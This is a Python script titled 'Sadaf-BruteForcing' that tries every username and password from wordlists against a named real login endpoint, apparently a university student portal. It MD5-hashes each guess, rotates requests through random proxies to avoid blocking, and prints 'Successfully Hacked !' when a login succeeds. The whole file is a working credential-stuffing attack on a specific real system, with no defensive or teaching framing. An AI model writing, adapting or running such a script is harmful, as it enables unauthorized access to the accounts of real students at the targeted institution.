# Sadaf-BruteForcing

# HTTP, HTTPS Or ...
# Managing Modules
# Use A Proxy For Multiple Targets

import requests, hashlib, random

print("Sadaf BruteForcing Started Working !")

proxies_file = [every_line.strip('\n') for every_line in open('Proxies.txt', 'r')]


def convert_to_md5(password):
    return hashlib.md5(password.encode('UTF-8')).hexdigest()


def check_results(username, password):
    
    proxies = {
        "http": random.choice(proxies_file)
    }

    payload = dict(UserID=username, UserPassword=convert_to_md5(password))

    try:
        request = requests.post('http://puya.ubahar.ir/gateway/UserInterim.php', payload, proxies=proxies)

        if request.status_code == 200:
            if 'پورتال دانشجویی' in request.text:
                print(username + ' - ' + password + ' - Successfully Hacked !')
            else:
                print(username + ' - ' + password)
        else:
            print('HTTP Code Error : ' + username + ' - ' + password)

    except:
        print('Connection Error : ' + username + ' - ' + password)


usernames_file = [every_line.strip('\n') for every_line in open('Usernames.txt', 'r')]
passwords_file = [every_line.strip('\n') for every_line in open('Passwords.txt', 'r')]

for checking_username in usernames_file:
    for checking_password in passwords_file:
        check_results(checking_username, checking_password)
